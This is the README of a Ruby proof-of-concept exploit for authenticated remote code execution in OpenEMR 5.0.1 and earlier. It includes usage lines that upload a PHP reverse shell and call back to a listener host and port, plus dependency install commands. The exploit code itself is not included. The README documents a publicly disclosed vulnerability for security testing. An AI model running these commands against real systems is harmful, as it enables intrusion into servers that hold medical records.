# OpenEMR RCE exploit / PoC

> OpenEMR <= 5.0.1 - (Authenticated) Remote Code Execution

[[PacketStorm](https://packetstormsecurity.com/files/158711/OpenEMR-5.0.1-Remote-Code-Execution.html)] [[WLB-2020080011](https://cxsecurity.com/issue/WLB-2020080011)]

## Usage

```
$ ruby exploit.rb --help
OpenEMR <= 5.0.1 - (Authenticated) Remote Code Execution

Usage:
  exploit.rb manual --root-url <url> --shell <filename> --user <username> --password <password> [--debug]
  exploit.rb semi-auto --root-url <url> --user <username> --password <password> --payload <payload> --lhost <host> --lport <port> [--debug]
  exploit.rb auto --root-url <url> --user <username> --password <password> --lhost <host> --lport <port> [--debug]
  exploit.rb -H | --help

Options:
  -r <url>, --root-url <url>            Root URL (base path) including HTTP scheme, port and root folder
  -s <filename>, --shell <filename>     Filename of the PHP reverse shell payload
  -u <username>, --user <username>      Username of the admin
  -p <password>, --password <password>  Password of the admin
  -m <payload>, --payload <payload>     Metasploit PHP payload
  -h <host>, --lhost <host>             Reverse shell local host
  -t <port>, --lport <port>             Reverse shell local port
  --debug                               Display arguments
  -H, --help                            Show this screen

Examples:
  exploit.rb manual -r http://example.org/openemr -s myRevShell.php -u admin -p pass123
  exploit.rb semi-auto -r http://example.org:8080/openemr -u admin_emr -p qwerty2020 -m 'php/reverse_php' -h 10.0.0.2 -t 8888
  exploit.rb auto -r https://example.org:4443 -u admin_usr -p rock5 -h 192.168.0.2 -t 9999
```

## Modes

- **Auto**: you know the target and have your listener ready, let the exploit handle the rest
- **Semit-auto**: same as auto but you would like to specify another payload than the default `php/reverse_php`
- **Manual**: you already have a custom PHP reverse shell, the exploit lets you specify it

## Requirements

- [httpclient](https://github.com/nahi/httpclient)
- [docopt.rb](https://github.com/docopt/docopt.rb)
- (Optional) [Metasploit Framework](https://github.com/rapid7/metasploit-framework) (`msfvenom` for reverse shell generation in auto and semi-auto modes)

Example for BlackArch:

```
pacman -S ruby-httpclient ruby-docopt metasploit
```

Example using gem:

```
gem install httpclient docopt
```

## Reference

This is a better re-write of [EDB-ID-48515][EDB-ID-48515]:

- using arguments (instead of hardcoded values)
- allowing custom PHP reverse shell or auto generating one with `msfconsole`
- cleaner & more customizable
- using ruby (python2 is deprecated)

This exploit was tested with Ruby 2.7.1.

About [EDB-ID-48515][EDB-ID-48515]:

```
Exploit Author: Musyoka Ian
Date: 2020-05-25
Vendor Homepage: https://www.open-emr.org/
Software Link: https://github.com/openemr/openemr/archive/v5_0_1_3.tar.gz
Dockerfile: https://github.com/haccer/exploits/blob/master/OpenEMR-RCE/Dockerfile 
Version: < 5.0.1 (Patch 4)
Tested on: Ubuntu LAMP, OpenEMR Version 5.0.1.3
References: https://medium.com/@musyokaian/openemr-version-5-0-1-remote-code-execution-vulnerability-2f8fd8644a69
```

[EDB-ID-48515]:https://www.exploit-db.com/exploits/48515
